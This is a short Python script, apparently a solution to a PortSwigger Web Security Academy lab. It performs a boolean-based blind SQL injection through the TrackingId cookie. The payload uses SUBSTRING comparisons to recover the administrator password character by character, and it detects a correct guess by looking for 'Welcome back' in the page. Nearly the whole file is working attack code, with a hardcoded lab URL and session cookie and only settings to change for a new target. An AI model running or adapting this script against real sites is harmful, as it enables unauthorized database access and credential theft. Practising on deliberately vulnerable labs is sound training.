import requests
import string

# === CONFIGURATION ===
URL = "https://0a6e004c047260f88147257a00d20024.web-security-academy.net/"  # Replace with your actual  URL
SESSION_COOKIE = "lOvRcLy1HinAOuVbLwEJhE5GCMZ1OajQ"              # Replace if session cookie is required
INJECTION_POINT = "uJEOQEpITWS65hWW"                                  
CHARS = string.ascii_lowercase + string.digits          
PASSWORD_LENGTH = 20                                                  # Add password legnth 

# === STARTING ATTACK ===
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html",
}

password = ""

print("[*] Starting blind SQLi attack to extract administrator password...\n")

for i in range(1, PASSWORD_LENGTH + 1):
    found = False
    for char in CHARS:
        payload = f"{INJECTION_POINT}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{char}'--"
        cookies = {
            "TrackingId": payload,
            "session": SESSION_COOKIE
        }

        response = requests.get(URL, headers=headers, cookies=cookies)

        if "Welcome back" in response.text:
            print(f"[+] Found character {i}: {char}")
            password += char
            found = True
            break
    if not found:
        print(f"[!] Character at position {i} not found in charset. Try adding more symbols.")
        password += '?'

print(f"\n[✓] Administrator password: {password}")
input("\nPress Enter to exit...")


